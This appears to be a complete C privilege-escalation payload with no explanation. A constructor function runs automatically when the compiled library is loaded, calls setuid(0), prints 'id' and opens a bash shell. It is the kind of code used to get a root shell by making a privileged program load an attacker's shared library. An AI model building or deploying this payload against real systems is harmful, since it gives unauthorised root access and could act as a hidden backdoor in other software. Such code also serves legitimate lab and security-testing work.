#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

__attribute((constructor))
static void sice() {
    setuid(0);
    system("id");
    system("bash");
    exit(0);
}
